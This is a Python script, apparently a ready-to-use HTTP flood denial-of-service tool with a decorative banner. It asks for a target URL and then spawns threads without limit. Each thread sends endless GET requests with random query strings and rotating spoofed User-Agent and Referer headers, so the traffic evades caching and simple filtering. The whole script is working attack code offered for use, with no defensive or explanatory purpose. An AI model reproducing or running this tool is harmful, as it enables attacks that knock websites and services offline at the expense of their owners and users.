import os
import sys
import requests
import threading
import random
import fade

if os.name == "nt":  # Windows
    os.system("cls")
else:  # Unix/Linux/Mac
     os.system("clear")


logo = """
══════════════════════════════════════════════════════════════════
                                                                  
  ╔═══╗ ╔═══╗ ╔═══════╗ ╔═╗       ╔═══════╗  ╔══════╗ ╔═╗ ╔═══╗   
  ║▒▒═╗▒╔═╗▒║ ║▒╔═══╗▒║ ║▒║       ║▒╔═══╗▒║  ║▒═════╝ ║▒║ ║▒╔═╝   
  ║▒║ ║▒║ ║▒║ ║▒║   ║▒║ ║▒║       ║▒║   ║▒║  ║▒║      ║▒╚═══╝    
  ║▒║ ║▒║ ║▒║ ║▒╚═══╝▒║ ║▒║       ║▒╚═══╝▒║  ║▒║      ║▒╔═══╗     
  ║▒║ ╚═╩ ║▒║ ║▒╔═══╗▒║ ║▒║═════╗ ║▒╔═══╗▒║  ║▒═════╗ ║▒║ ║▒╚═╗   
  ╚═╝     ╚═╝ ╚═╝   ╚═╝ ╚═══════╝ ╚═╝   ╚═╝  ╚══════╝ ╚═╝ ╚═══╝   
                                                                  
\033[92m   ╔═══╗ ╗     ╔═══╗ ╔══╗ ╗  ╔     ╔═══╗ ╔═══╗ ╔══╗══╗ ╗    ╔\033[0m  
\033[92m   ║   ║ ║     ║   ║ ║    ║  ║     ║   ║ ║   ║ ║  ║  ║ ║    ║\033[0m   
\033[92m   ║══╗╝ ║     ╔═══╗ ║    ║══╝╗    ╔═══╗ ║═══╗ ║  ║  ║  ══╔═ \033[0m   
\033[92m   ╚══╝  ════╝ ╝   ╚ ╚══╝ ╝   ╚    ╝   ╚ ╝   ╚ ╝     ╚    ╚  \033[0m

\033[33m══════════════════════ \033[37mJ A N C O K Z O S A N\033[33m ═════════════════════
"""
faded_text = fade.fire(logo)
print(faded_text)
ask = fade.pinkred("\033[33m⟩⟩URL Target:\033[31m ✓✓ \033[0m")
url = input(ask)
u = int(0)
headers = []
referer = [
    "https://github.com/",
    "https://google.it/",
    "https://facebook.com/",
    "https://alibaba.com/",
    "https://google.com/",
    "https://youtube.com",
    ]

def useragent():
    global headers
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")

    return headers


def genstr(size):
    out_str = ''

    for _ in range(0, size):
        code = random.randint(65, 90)
        out_str += chr(code)
    
    return out_str


class httpth1(threading.Thread):
    def run(self):
        global u
        while True:
            try:
                headers={'User-Agent' : random.choice(useragent()), 'Referer' : random.choice(referer)}
                randomized_url = url + "?" + genstr(random.randint(3, 10))
                requests.get(randomized_url, headers=headers)
                u += 1
                print("[*]  \033[31mN0ZZ --> \033[31m " +str(u)+ "   \033[37mSend the packet  \033[34m " +url+ "\033[0m" )  
                print("[*]  \033[31mN0ZZ --> \033[31m " +str(u)+ "   \033[37mSend the packet  \033[34m " +url+ "\033[0m" )      
            except requests.exceptions.ConnectionError:
                print("[*]  \033[1mN0ZZ --> \033[1m " +str(u)+ "   \033[97mSend the packet  \033[35m " +url+ "\033[0m" )
                pass
            except requests.exceptions.InvalidSchema:
                print ("[URL Error]")
                raise SystemExit()
            except ValueError:
                print ("[Check Your URL]")
                raise SystemExit()
            except KeyboardInterrupt:
                print("[Canceled by User]")
                raise SystemExit()


while True:
    try:
        th1 = httpth1()
        th1.start()
    except Exception:
        pass
    except KeyboardInterrupt:
        exit("[Canceled By User]")
        raise SystemExit()
